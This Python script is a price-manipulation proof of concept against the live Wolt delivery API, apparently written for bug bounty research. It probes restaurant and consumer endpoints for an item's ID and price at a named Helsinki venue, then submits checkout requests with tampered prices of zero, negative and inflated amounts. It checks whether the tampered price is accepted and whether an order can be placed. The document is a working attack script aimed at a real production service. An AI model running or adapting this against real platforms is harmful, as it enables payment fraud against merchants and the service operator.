"""Price manipulation PoC v2 - use real venue, find items from alternative sources."""
import requests, json

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}

VENUE_SLUG = 'wolt-market-kamppi'

def find_item_in_json(obj, depth=0):
    """Recursively search for an object with id+name+price."""
    if depth > 6:
        return None
    if isinstance(obj, dict):
        if 'id' in obj and ('name' in obj or 'title' in obj) and ('baseprice' in obj or 'price' in obj):
            iid = obj.get('id')
            iprice = obj.get('baseprice') or obj.get('price')
            if iid and isinstance(iprice, (int, float)) and iprice > 0:
                return (iid, obj.get('name') or obj.get('title', ''), iprice)
        for v in obj.values():
            result = find_item_in_json(v, depth+1)
            if result:
                return result
    elif isinstance(obj, list):
        for v in obj[:30]:
            result = find_item_in_json(v, depth+1)
            if result:
                return result
    return None

# Step 1: Get venue dynamic
r = requests.get(
    f'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/{VENUE_SLUG}/dynamic/',
    params={'selected_delivery_method': 'homedelivery'},
    headers=H
)
vd = r.json()
vr = vd['venue_raw']
venue_id = vr['id']
print(f"[1] Venue: {venue_id}, keys: {list(vd.keys())}")
print(f"    do_use_backend_pricing: {vd.get('do_use_backend_pricing')}")
print(f"    order_minimum: {vd.get('order_minimum')}")

# Step 2: Search for items from multiple APIs
print(f"\n[2] Searching for items...")
item_info = None

# 2a: restaurant-api
for ep in [
    f'/v1/restaurants/{venue_id}',
    f'/v1/restaurants/{venue_id}/menu',
    f'/v1/venue/{venue_id}/menu',
    f'/v2/restaurants/{venue_id}',
    f'/v1/pages/restaurant?slug={VENUE_SLUG}',
]:
    try:
        r = requests.get(f'https://restaurant-api.wolt.com{ep}', headers=H, timeout=10)
        if r.status_code == 200 and 'json' in r.headers.get('content-type', ''):
            result = find_item_in_json(r.json())
            if result:
                item_info = result
                print(f"    [FOUND] {ep}: {result[1]} price={result[2]}")
            else:
                print(f"    {ep}: {r.status_code} | no items in response")
        else:
            print(f"    {ep}: {r.status_code}")
    except Exception as e:
        print(f"    {ep}: ERR {str(e)[:60]}")
    if item_info:
        break

# 2b: venue static
if not item_info:
    for ep in [
        f'/order-xp/web/v1/venue/slug/{VENUE_SLUG}/static/',
        f'/order-xp/web/v1/venue/slug/{VENUE_SLUG}/',
    ]:
        try:
            r = requests.get(f'https://consumer-api.wolt.com{ep}', headers=H, timeout=10)
            if r.status_code == 200 and 'json' in r.headers.get('content-type', ''):
                result = find_item_in_json(r.json())
                if result:
                    item_info = result
                    print(f"    [FOUND] {ep}: {result[1]} price={result[2]}")
                else:
                    print(f"    {ep}: {r.status_code} | no items")
            else:
                print(f"    {ep}: {r.status_code}")
        except Exception as e:
            print(f"    {ep}: ERR {str(e)[:60]}")
        if item_info:
            break

# 2c: discovery/search API
if not item_info:
    for ep in [
        f'/discovery/v1/venues/slug/{VENUE_SLUG}',
        f'/search/v1/venue/{VENUE_SLUG}',
    ]:
        try:
            r = requests.get(f'https://consumer-api.wolt.com{ep}', headers=H, timeout=10)
            if r.status_code == 200 and 'json' in r.headers.get('content-type', ''):
                result = find_item_in_json(r.json())
                if result:
                    item_info = result
                    print(f"    [FOUND] {ep}: {result[1]} price={result[2]}")
                else:
                    print(f"    {ep}: {r.status_code} | no items")
            else:
                print(f"    {ep}: {r.status_code}")
        except Exception as e:
            print(f"    {ep}: ERR {str(e)[:60]}")
        if item_info:
            break

if not item_info:
    print("\n[FAIL] Cannot find any item. Dumping venue_raw for analysis...")
    print(json.dumps({k: str(v)[:100] for k, v in vr.items()}, indent=2)[:1000])
    exit()

item_id, item_name, item_price = item_info

# Step 3: Build checkout payload with manipulated price
print(f"\n[3] === PRICE MANIPULATION TEST ===")
print(f"    Real price: {item_price}")

for manip_price in [1, 0, -1, item_price * 100]:
    body = {
        'items': [{
            'id': item_id,
            'name': item_name,
            'count': 1,
            'price': manip_price,
            'base_price': manip_price,
            'end_amount': manip_price,
            'options': [],
            'restrictions': [],
            'category_id': '',
            'exclude_from_discounts': False,
        }],
        'base_price': manip_price,
        'end_amount': manip_price,
        'supplier_id': venue_id,
        'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR',
        'vendor': 'wolt',
        'discount': 0,
        'surcharges': [],
        'pickup': False,
        'scheduled_time': None,
        'shipping_method': 'homedelivery',
        'basket_id': f'test-basket-{venue_id}-{manip_price}',
        'discount_code': None,
    }

    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                      headers=H, json=body)
    print(f"\n    Manipulated price={manip_price}:")
    print(f"    Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        pa = d.get('payable_amount', 'N/A')
        print(f"    payable_amount: {pa}")
        print(f"    Response keys: {list(d.keys())[:15]}")
        if isinstance(pa, (int, float)):
            diff = pa - manip_price
            print(f"    Diff from manipulated: {diff}")
            if abs(diff) < 5:
                print(f"    *** PRICE ACCEPTED AS-IS! ***")
        s = json.dumps(d)
        for keyword in ['place_order', 'place-order', 'create_order', 'submit_order']:
            if keyword in s.lower():
                print(f"    Found '{keyword}' - order placement possible!")
    elif r.status_code == 400:
        print(f"    Error: {r.text[:300]}")
    else:
        print(f"    Body: {r.text[:200]}")

print("\nDONE")
